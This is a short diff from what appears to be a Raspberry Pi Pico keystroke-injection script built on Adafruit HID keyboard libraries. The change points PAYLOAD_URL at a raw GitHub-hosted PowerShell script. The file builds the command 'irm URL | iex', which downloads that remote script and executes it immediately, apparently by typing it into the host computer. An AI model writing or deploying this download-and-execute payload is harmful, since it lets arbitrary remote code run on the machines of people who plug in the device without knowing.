@@ -8,7 +8,7 @@ from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 INITIAL_SLEEP_TIME = 2.0
 SLEEP_TIME = 0.5
 
-PAYLOAD_URL = "http://script.ps1"
+PAYLOAD_URL = "https://raw.githubusercontent.com/davide-fornaro/raspberry_pico_keyboard/refs/heads/main/script.ps1"
 PAYLOAD_COMMAND = f"irm {PAYLOAD_URL} | iex"
 
 NUMPAD = {
